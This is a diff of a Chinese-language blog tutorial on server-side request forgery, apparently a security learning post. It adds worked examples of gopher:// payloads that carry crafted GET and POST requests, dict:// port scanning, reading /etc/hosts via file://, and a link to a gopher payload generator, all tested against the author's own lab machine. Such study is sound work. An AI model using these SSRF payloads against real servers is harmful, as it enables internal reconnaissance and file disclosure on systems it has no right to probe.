@@ -87,9 +87,20 @@
 `gopher://host:port/path/data-flow`
 {{&lt; /admonition &gt;}}
 
-一点例子：
+**一点例子：**
 
 &lt;br&gt;
+
+在一端监听6666端口，另一端通过curl&#43;gopher发送数据信息&lt;br&gt;
+![gopher2](../post_5/pics/gopher2.png)
+
+
+![gopher1](../post_5/pics/gopher1.png)
+&lt;br&gt;(无视那个hello，多打的。)
+
+&lt;br&gt;
+&lt;hr&gt;
+
 
 #### GET请求：
 
@@ -97,18 +108,22 @@
 GET /ssrf/base/get.php?a=hello HTTP/1.1
 HOST: 192.xxx.xxx.xxx
 ```
-
+通过URL编码 &#43; 最后补 `%0d%0a`(表示结束) 进行gopher协议数据格式化&lt;br&gt;
 通过gopher进行传输就是
 &lt;br&gt;
 ```html
 gopher://192.xxx.xxx.xxx:80/_GET%20/ssrf/base/get.php%3fa=hello%20HTTP/1.1%0d%0AHost:%20192.xxx.xxx.xxx%0d%0A
 ```
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;举一个例子&lt;br&gt;&lt;br&gt;
+![gopherget](../post_5/pics/gopherget.png)
 
 
-&lt;br&gt;
+截取了抓取的数据包的前两行，通过URL-encode得到结果，然后往前添加`_`，往后添加`%0d%0a`，用curl传输，结果如左边。&lt;br&gt;
+换行符URL编码`%0A`
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
 
 #### POST请求
-
+&gt;一个道理，不再赘述
 &lt;br&gt;
 
 ```html
@@ -123,8 +138,12 @@ name=Margin
 gopher://192.168.0.109:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A
 
 ```
-
 &lt;br&gt;
+
+[构造工具](https://github.com/tarunkant/Gopherus)
+&lt;br&gt;
+
+&lt;hr&gt;
 
 #### 利用点
 
@@ -607,10 +626,23 @@ save
 &gt;词典网络协议，在RFC 2009中进行描述。它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。
 
 
+
 {{&lt; admonition type=info title=&#34;一些info&#34; open=true &gt;}}
 `dict://&lt;user&gt;;&lt;auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;:&lt;database&gt;:&lt;n&gt;`
 `ssrf.php?url=dict://attacker:11111/`
 {{&lt; /admonition &gt;}}
+
+&lt;br&gt;
+**举例时间：**
+端口范围：8000-9000&lt;br&gt;
+**dict协议**进行扫描端口
+![dict](../post_5/pics/dict.png)
+
+
+
+
+
+
 
 
 - 如果服务端不支持gopher协议，可尝试dict协议
@@ -692,7 +724,7 @@ DNS重绑定攻击通常包括以下步骤：
 - URL Bypass：@；_涉及URL解析_
     - 原因
         
-        ## **URL解析规则**
+         **URL解析规则**
         
         在解析URL时,@符号之前的部分被解析为用户信息(credentials),@之后的部分才是真正的主机地址。所以当解析
         
@@ -918,18 +950,43 @@ curl -lv $vl.com
 
 &lt;br&gt;
 
+**访问外部**
 
 ![robots](../post_5/pics/2.png)
-访问外部是正常的
+
 &lt;br&gt;
-访问内部：
+
+**访问内部：**
 
 &lt;br&gt;
 
 ![inside](../post_5/pics/3.png)
 （PS：用作测试的虚拟机本地网站主页就是这个默认界面）
 
+&lt;br&gt;
+&lt;hr&gt;
 
+后面为了方便，就移到了Linux上
+在上述步骤确定存在SSRF之后，尝试用file协议读取文件内容
+&lt;br&gt;
+`file:///etc/hosts`
+&lt;br&gt;
+![file](../post_5/pics/hosts.png)
+
+
+获取了服务器的hosts文件内容，不过这是一个没有**IP地址和主机名映射**的（一般增加到最下面一行）
+
+&lt;br&gt;
+&lt;hr&gt;
+
+**dict协议探测端口**
+&gt;http协议也可以，不过要慢一点。
+
+![dict](../post_5/pics/dict.png)
+
+&lt;br&gt;
+&lt;hr&gt;
+.
 
 ---
 
